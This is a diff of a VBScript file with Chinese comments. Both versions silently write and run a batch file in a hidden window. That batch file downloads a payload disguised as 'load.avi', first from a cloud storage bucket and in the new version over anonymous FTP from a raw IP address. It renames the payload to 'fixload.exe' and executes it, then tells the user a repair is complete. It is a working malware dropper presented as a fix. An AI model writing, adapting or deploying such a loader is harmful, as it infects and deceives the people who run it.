@@ -1,34 +1,35 @@
-Dim fso, cmdFile, cmdContent, shell
+Dim objFSO, objFile, objShell
+Dim cmdFile, ftpFile, exeFile
 
-' 创建 FileSystemObject
-Set fso = CreateObject("Scripting.FileSystemObject")
+' 设置文件名
+ftpFile = "load.avi"
+exeFile = "fixload.exe"
+cmdFile = "updat.bat"
 
-' 定义 cmd 文件路径
-cmdFile = fso.GetAbsolutePathName(".") & "\updat1.cmd"
+' 创建文件系统对象和外部程序对象
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objShell = CreateObject("WScript.Shell")
 
-' 定义 cmd 文件内容
-cmdContent = "@echo off" & vbCrLf & _
-             "echo 正在下载文件..." & vbCrLf & _
-             "curl -o load.avi https://updatesdwn.oss-cn-shanghai.aliyuncs.com/load.avi" & vbCrLf & _
-             "if %errorlevel% neq 0 (" & vbCrLf & _
-             "    echo 下载失败!" & vbCrLf & _
-             "    exit /b" & vbCrLf & _
-             ")" & vbCrLf & _
-             "echo 下载完成，正在重命名..." & vbCrLf & _
-             "ren load.avi fixload.exe" & vbCrLf & _
-             "echo 正在执行 fixload.exe..." & vbCrLf & _
-             "start /wait fixload.exe" & vbCrLf & _
-             "echo 修复完成!"
+' 创建 updat.bat 文件
+Set objFile = objFSO.CreateTextFile(cmdFile, True)
+objFile.WriteLine "@echo off"
+objFile.WriteLine "echo Downloading file from FTP..."
+objFile.WriteLine "echo open 8.210.202.2>> ftp_commands.txt" ' FTP 服务器地址
+objFile.WriteLine "echo anonymous>> ftp_commands.txt"
+objFile.WriteLine "echo user@domain.com>> ftp_commands.txt" ' 替换为实际的电子邮件
+objFile.WriteLine "echo binary>> ftp_commands.txt"
+objFile.WriteLine "echo cd D:/>> ftp_commands.txt" ' 切换到目标目录
+objFile.WriteLine "echo get " & ftpFile & ">> ftp_commands.txt"
+objFile.WriteLine "echo bye>> ftp_commands.txt"
+objFile.WriteLine "ftp -s:ftp_commands.txt"
+objFile.WriteLine "del ftp_commands.txt"
+objFile.WriteLine "ren " & ftpFile & " " & exeFile
+objFile.WriteLine "start " & exeFile
+objFile.WriteLine "echo 修复完成"
+objFile.Close
 
-' 创建并写入 cmd 文件
-With fso.CreateTextFile(cmdFile, True)
-    .WriteLine cmdContent
-    .Close
-End With
-
-' 创建 Shell 对象并执行 cmd 文件
-Set shell = CreateObject("WScript.Shell")
-shell.Run cmdFile, 0, True
+' 自动执行 updat.bat
+objShell.Run cmdFile, 0, True
 
 ' 提示用户
-MsgBox "刷新网页即可。", vbInformation, "提示"
+WScript.Echo "修复完成"
